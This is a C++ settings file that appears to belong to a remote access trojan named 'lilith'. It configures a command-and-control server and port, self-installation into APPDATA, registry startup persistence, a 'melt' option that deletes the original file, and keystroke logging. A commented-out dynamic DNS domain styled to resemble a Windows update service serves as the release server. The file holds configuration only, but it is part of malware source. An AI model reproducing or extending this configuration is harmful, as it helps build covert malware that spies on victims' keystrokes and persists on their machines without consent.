#include "settings.h"

#if _DEBUG
std::string Settings::serverIP = "127.0.0.1";		//server ip
int Settings::serverPort = 1337;	//server port

std::string Settings::fileName = "lilithDEBUG.exe";					//file name
std::string Settings::folderName = "lilithDEBUG folder";					//name of folder where file is located
std::string Settings::startupName = "lilithDEBUG startup";		//startup name in registry / taskmgr
std::string Settings::logFileName = "log.txt";								//name of log file
std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
std::string Settings::keylogPath = "keylog.txt";		//path of the keylog file
bool Settings::installSelf = false;				//specifies whether the program should install itself
bool Settings::startOnNextBoot = false;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
bool Settings::setStartupSelf = false;			//specifies whether the program is to be started on system boot
bool Settings::logEvents = true;			//specifies whether the program should log events (like errors etc)
bool Settings::logKeys = false;	//[EARLY STAGE, VERY RESOURCE-DEMANDING]	//specifies whether the program should log the users keystrokes

#else

std::string Settings::serverIP = "sample.ip.net";	/*windistupdate.ddns.net*/	//server ip
int Settings::serverPort = 1337;	//server port

std::string Settings::fileName = "lilithRELEASE.exe";					//file name
std::string Settings::folderName = "lilithRELEASE folder";					//name of folder where file is located
std::string Settings::startupName = "lilithRELEASE startup";		//startup name in registry / taskmgr
std::string Settings::logFileName = "log.txt";								//name of log file
std::string Settings::installLocation = "APPDATA";			//install location (appdata, programdata etc)
std::string Settings::keylogPath = "keylog.txt";
bool Settings::installSelf = true;				//specifies whether the program should install itself
bool Settings::startOnNextBoot = false;		//specifies whether it should startup the installed clone of itself NOW or ON THE NEXT BOOT (ONLY IMPORTANT FOR INSTALLATION PROCESS)
bool Settings::meltSelf = false;				//specifies whether the installed clone should delete the initial file
bool Settings::setStartupSelf = true;			//specifies whether the program is to be started on system boot
bool Settings::logEvents = true;			//specifies whether the program should log events (like errors etc)
bool Settings::logKeys = false;		//[EARLY STAGE, VERY RESOURCE-DEMANDING]	//specifies whether the program should log the users keystrokes

#endif